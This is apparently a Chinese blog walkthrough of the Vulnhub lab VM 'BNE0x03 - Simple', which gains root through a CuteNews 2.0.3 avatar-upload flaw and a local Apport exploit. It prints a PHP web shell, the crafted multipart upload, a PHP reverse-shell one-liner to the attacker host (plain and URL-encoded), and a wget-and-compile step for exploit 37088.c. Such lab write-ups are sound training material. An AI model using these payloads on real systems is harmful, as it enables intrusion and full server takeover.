---
title: Vulnhub-SecTalks：BNE0x03 - Simple
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# SecTalks：BNE0x03 - Simple

> https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`170`
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 13:38 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00024s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.170
    Host is up (0.000088s latency).
    MAC Address: 00:0C:29:B4:EA:57 (VMware)
    Nmap scan report for 192.168.75.171
    Host is up (0.00032s latency).
    MAC Address: 00:0C:29:B4:EA:57 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00022s latency).
    MAC Address: 00:50:56:EC:C5:A4 (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.170
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 13:39 CST
    Nmap scan report for 192.168.75.170
    Host is up (0.00075s latency).
    Not shown: 65534 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    80/tcp open  http
    MAC Address: 00:0C:29:B4:EA:57 (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p80 192.168.75.170
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 13:42 CST
    Nmap scan report for 192.168.75.170
    Host is up (0.00056s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    MAC Address: 00:0C:29:B4:EA:57 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80 192.168.75.170
    PORT   STATE SERVICE
    80/tcp open  http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-csrf:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.170
    |   Found the following possible CSRF vulnerabilities:
    |
    |     Path: http://192.168.75.170:80/
    |     Form id: login_form
    |     Form action: /index.php
    |
    |     Path: http://192.168.75.170:80/index.php
    |     Form id: login_form
    |     Form action: /index.php
    |
    |     Path: http://192.168.75.170:80/?register&lostpass
    |     Form id:
    |     Form action: /index.php
    |
    |     Path: http://192.168.75.170:80/?register
    |     Form id: regpassword
    |     Form action: /index.php?register
    |
    |     Path: http://192.168.75.170:80/index.php?register
    |     Form id: regpassword
    |_    Form action: /index.php?register
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-slowloris-check:
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    | http-enum:
    |   /rss.php: RSS or Atom feed
    |   /core/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
    |   /docs/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
    |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
    MAC Address: 00:0C:29:B4:EA:57 (VMware)
    
    ```
    

## web渗透

1. 先扫描吧
    
    ```python
    dirsearch -u 192.168.75.170 -x 403
    //
    [13:50:50] Starting:
    [13:51:13] 301 -  314B  - /core  ->  http://192.168.75.170/core/
    [13:51:16] 301 -  314B  - /docs  ->  http://192.168.75.170/docs/
    [13:51:16] 200 -  507B  - /docs/
    [13:51:18] 200 -    4KB - /example.php
    [13:51:18] 200 -    1KB - /favicon.ico
    [13:51:22] 200 -    1KB - /index.php
    [13:51:22] 200 -    1KB - /index.php/login/
    [13:51:25] 200 -    1KB - /LICENSE.txt
    [13:51:36] 200 -   28B  - /print.php
    [13:51:37] 200 -    2KB - /README.md
    [13:51:39] 200 -  118B  - /rss.php
    [13:51:39] 200 -  758B  - /search.php
    [13:51:42] 301 -  315B  - /skins  ->  http://192.168.75.170/skins/
    [13:51:48] 301 -  317B  - /uploads  ->  http://192.168.75.170/uploads/
    [13:51:48] 200 -  408B  - /uploads/
    ```
    
    - `/uploads/` 应该是一个上传目录
    - 通过README等来看，CMS能确定是`CuteNews 2.0.3`
2. 查阅CMS是否存在漏洞
    
    `searchsploit` 扫描出任意文件上传漏洞
    
    ```python
    searchsploit CuteNews 2.0.3
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                                                                                                              |  Path
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                                      | php/webapps/37474.txt
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    ```
    
    拉取下来，跟着步骤走
    
    ```python
              CuteNews 2.0.3 Remote File Upload Vulnerability
            =================================================
    1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
    0     _                   __           __       __                     1
    1   /' \            __  /'__`\        /\ \__  /'__`\                   0
    0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
    1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
    0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
    1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
    0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
    1                  \ \____/ >> Exploit database separated by exploit   0
    0                   \/___/          type (local, remote, DoS, etc.)    1
    1                                                                      1
    0  [+] Site            : Inj3ct0r.com                                  0
    1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
    0                                                                      0
    1               ##########################################             1
    0               I'm T0x!c member from Inj3ct0r Team             1
    1               ##########################################             0
    0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
    
    # Exploit Title: CuteNews 2.0.3 Remote File Upload Vulnerability
    # Date: [02/07/2015]
    # Exploit Author: [T0x!c]
    # Facebook: https://www.facebook.com/Dz.pr0s
    # Vendor Homepage: [http://cutephp.com/]
    # Software Link: [http://cutephp.com/cutenews/cutenews.2.0.3.zip]
    # Version: [2.0.3]
    # Tested on: [Windows 7]
    # greetz to :Tr00n , Kha&mix , Cc0de  , Ghosty , Ked ans , Caddy-dz .....
    ==========================================================
     # Exploit  :
    
    Vuln : http://127.0.0.1/cutenews/index.php?mod=main&opt=personal
    
     1 - Sign up for New User
     2 - Log In
     3 - Go to Personal options http://www.target.com/cutenews/index.php?mod=main&opt=personal
     4 - Select Upload Avatar Example: Evil.jpg
     5 - use tamper data  & Rename File Evil.jpg to Evil.php
    
    -----------------------------2847913122899\r\nContent-Disposition: form-data; name="avatar_file"; filename="Evil.php"\r\
    
    6 - Your Shell : http://127.0.0.1/cutenews/uploads/avatar_Username_FileName.php
    
     Example: http://127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php                  
    ```
    
3. 尝试利用CMS漏洞
    - 注册新用户
        
        随便填一下，我填的`sunset` `Aa118811`
        
    - 登陆进去来到 `Dashboard` > `Personal options`
    - 上传图片马然后抓包修改文件后缀为 `.php`
        
        ```python
        # shell2.jpg
        GIF89a
        <?php system($_GET['a']); ?>
        ```
        
        ```python
        -----------------------------228896324810094846214215287044
        Content-Disposition: form-data; name="avatar_file"; filename="shell2.php"  //修改后缀名
        Content-Type: image/png
        
        GIF89a
        <?php system($_GET['a']); ?>
        -----------------------------228896324810094846214215287044
        ```
        
        CMS提示`upload successfully`
        
4. 在 `Dashboard` > `Personal options` 复制头像链接，然后加上`a`参数尝试
    
    ```python
    # /uploads/avatar_sunset_shell2.php?a=ls
    GIF89a avatar_sunset_shell2.php 
    ```
    
    成功，我们执行反弹`shell`代码，同时`kali`开启监听
    
    ```python
    php -r '$sock=fsockopen("192.168.75.151",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
    
    注意进行`URL`编码
    
    ```python
    /uploads/avatar_sunset_shell2.php?a=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%37%35%2e%31%35%31%22%2c%31%32%33%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
    ```
    
    获得`shell`
    

## 提权

1. 查看权限
    
    ```python
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ whoami
    www-data
    $ uname -a
    Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
    ```
    
2. 敏感信息搜索，没找到扫描有用的信息
3. 尝试内核提权
    
    ```python
    searchsploit Linux Kernel 3.16.0 | grep Local
    //
    Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                                                                   | solaris/local/15962.c
    Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                                                           | linux/local/50135.c
    Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                                                                  | linux/local/41995.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                                        | linux/local/37292.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                                   | linux/local/37293.txt
    Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                                                                  | linux/local/41886.c
    Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                                                           | linux/local/34923.c
    Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                                                                | linux_x86-64/local/44302.c
    Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                                                                                                                | linux/dos/42136.c
    Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                                                           | linux/local/45553.c
    Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                                               | linux/local/45010.c
    Linux Kernel < 4.14.rc3 - Local Denial of Service                                                                                                                                           | linux/dos/42932.c
    Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                      | linux/local/44298.c
    Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                                           | linux_x86-64/local/44300.c
    Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                                       | linux/local/43418.c
    Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                                   | linux/local/47169.c
    ```
    
    尝试了几个无法提权，使用 `Ubuntu 14.04` 进行搜索
    
    ```python
    searchsploit Ubuntu 14.04
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                                                                                                              |  Path
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation                                                                                                                     | linux/local/37088.c
    Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                                                                                                                                 | linux/local/36782.sh
    Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                                                                                                            | linux/local/40937.txt
    Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation                                  | linux_x86-64/local/42275.c
    Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                                                         | linux_x86/local/42276.c
    Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open()' Can Race with execve() (Access /etc/shadow)                                                                                             | linux/local/39771.txt
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                                        | linux/local/37292.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                                   | linux/local/37293.txt
    Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP Privilege Escalation                                                                                    | linux/local/41999.txt
    Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                                                                        | linux/local/39166.c
    Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                                            | linux_x86-64/local/40871.c
    Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                                 | windows_x86-64/local/47170.c
    Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                                       | linux/local/43418.c
    Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                                   | linux/local/47169.c
    NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                                                                                                                            | linux/dos/37777.txt
    Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation                                                                                                             | linux/local/41762.txt
    Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                                                      | linux/local/41760.txt
    usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation                                                                                                                   | linux/local/36820.txt
    WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                                                                                                                                 | linux/local/44204.md
    -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    ```
    
    第一个就是本地权限提升的，我们尝试一下 `37088.c` ，查看文件没有特殊的编译要求，我们将它下载到靶机，然后编译执行，提权成功
    
    ```python
    $ wget 192.168.75.151/37088.c
    100%[======================================>] 6,027       --.-K/s   in 0s      
    2024-10-30 02:50:19 (34.9 MB/s) - '37088.c' saved [6027/6027]
    $ gcc 37088.c -o 37088
    gcc 37088.c -o 37088
    $ ./37088
    ./37088
    created /var/crash/_bin_sleep.33.crash
    crasher: my pid is 1559
    apport stopped, pid = 1560
    getting pid 1559
    current pid = 1558..2500..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..
    ** child: current pid = 1559
    ** child: executing /bin/su
    Password: sleeping 2s..
    
    checker: mode 4516
    waiting for file to be unlinked..writing to fifo
    fifo written.. wait...
    waiting for /etc/sudoers.d/core to appear..
    
    checker: new mode 32768 .. done
    checker: SIGCONT
    checker: writing core
    checker: done
    success
    # id
    'id
    uid=0(root) gid=0(root) groups=0(root)
    ```